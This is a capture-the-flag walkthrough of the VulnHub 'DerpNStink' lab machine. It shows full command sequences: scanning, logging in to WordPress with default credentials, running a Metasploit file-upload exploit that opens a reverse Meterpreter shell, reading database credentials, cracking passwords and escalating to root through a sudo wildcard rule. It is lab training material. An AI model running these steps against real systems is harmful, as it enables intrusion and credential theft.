DirtNStink

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] WPscan - default admin credentials 
[+] Wordpress Plugin Exploit -  Slideshow
[+] Wireshark Pcap analysis
[+] Privilege Escalation Abusing SUDO rights /binaries/derpy*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scanning Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
map scan report for 192.168.56.101
Host is up (0.00083s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:66:46:4B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Analysing the source page of the http://192.168.56.101 we get the first flag:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.101
... snip ...
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Adding the host in /etc/hosts

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kal1
192.168.56.101	derpnstink.local

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb identified a /weblog that is hosted with wordpress

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DerpNStink/derpnstink1.png)

Tying credentials admin:admin we are able to login.

After loggin in we identify a Slideshow plugin. 
Searching for an exploit on this wordpress plugin.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > search wp_slide

Matching Modules
================

   Name                                            Disclosure Date  Rank       Check  Description
   ----                                            ---------------  ----       -----  -----------
   exploit/unix/webapp/wp_slideshowgallery_upload  2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload


msf5 > use exploit/unix/webapp/wp_slideshowgallery_upload
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_PASSWORD admin
wp_PASSWORD => admin
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set wp_user admin
wp_user => admin
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set rhosts 192.168.56.101
rhosts => 192.168.56.101
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set targeturi /weblog/
target => /weblog/
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Trying to login as admin
[*] Trying to upload payload
[*] Uploading payload
[*] Calling uploaded file bdelqqbz.php
[*] Sending stage (38247 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:44256) at 2019-10-19 21:08:37 -0400
[+] Deleted bdelqqbz.php

meterpreter > 
meterpreter > shell
Process 4508 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash");'
</html/weblog/wp-content/uploads/slideshow-gallery$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting database credentials:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php


/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

...snip...
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
...snip ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Logging in into php admin we get the following usernames and passwords:

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DerpNStink/derpnstink2.png)

Cracking the password hash we get the following credentials :

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DerpNStink/derpnstink3.png)

We try to login with username : stinky and password: wedgie57


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@DeRPnStiNK:/var/www/html$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html$ id
id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
stinky@DeRPnStiNK:~/Desktop$ cat flag.txt
cat flag.txt
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pcap file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
stinky@DeRPnStiNK:~/Documents$ ls -al
ls -al
total 4300
drwxr-xr-x  2 stinky stinky    4096 Nov 13  2017 .
drwx------ 12 stinky stinky    4096 Oct 20 00:37 ..
-rw-r--r--  1 root   root   4391468 Nov 13  2017 derpissues.pcap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Copy the derpissue.pcap to /ftp folder.
Connect to FTP to download the pcap file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ ftp
ftp> open 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:setrus): stinky
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001      4391468 Oct 20 04:45 derpissues.pcap
drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
226 Directory send OK.
ftp> get derpissues.pcap
local: derpissues.pcap remote: derpissues.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for derpissues.pcap (4391468 bytes).
226 Transfer complete.
4391468 bytes received in 0.21 secs (19.5075 MB/s)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Analysing the file with wireshark we found the password for user mrderp.

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DerpNStink/derpnstink4.png)

Connecting as mrderp : derpderpderpderpderpderpderp


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/dirkNStink# ssh mrderp@192.168.56.101
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

mrderp@192.168.56.101's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

331 packages can be updated.
231 updates are security updates.

Last login: Mon Nov 13 01:03:13 2017 from 192.168.1.129
mrderp@DeRPnStiNK:~$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mrderp@DeRPnStiNK:~$ sudo -l
[sudo] password for mrderp: 
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
mrderp@DeRPnStiNK:~$ 
mrderp@DeRPnStiNK:~$ mkdir binaries
mrderp@DeRPnStiNK:~$ cd binaries/
mrderp@DeRPnStiNK:~/binaries$ echo '/bin/bash' > derpy.sh
mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh 
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# 

root@DeRPnStiNK:/root/Desktop# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

